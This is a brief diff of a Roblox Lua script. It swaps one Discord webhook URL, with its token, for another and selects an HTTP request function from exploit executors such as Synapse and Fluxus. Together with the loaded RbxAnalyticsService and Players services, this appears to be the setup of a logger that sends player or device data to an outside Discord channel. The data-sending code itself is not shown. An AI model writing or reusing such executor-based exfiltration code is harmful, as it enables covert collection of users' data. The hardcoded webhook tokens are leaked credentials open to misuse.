@@ -6,7 +6,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local Players = game:GetService("Players")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1341321907437436999/LAc4oaP77sn7Py_zSbIV8SRKiEZaHgGIthCD0RmEjjEpR8XmYMwtFA-ZnTfxq0DfiDwQ"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1341321903482339411/b_OcbGSCIMndEFjc-u7_2QAzpJ0CCBm8RZj2fx_0EQ-_Xtw0wVA22XkAyZoME8yHXd-a"
 
 local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
 if not http_request then return end
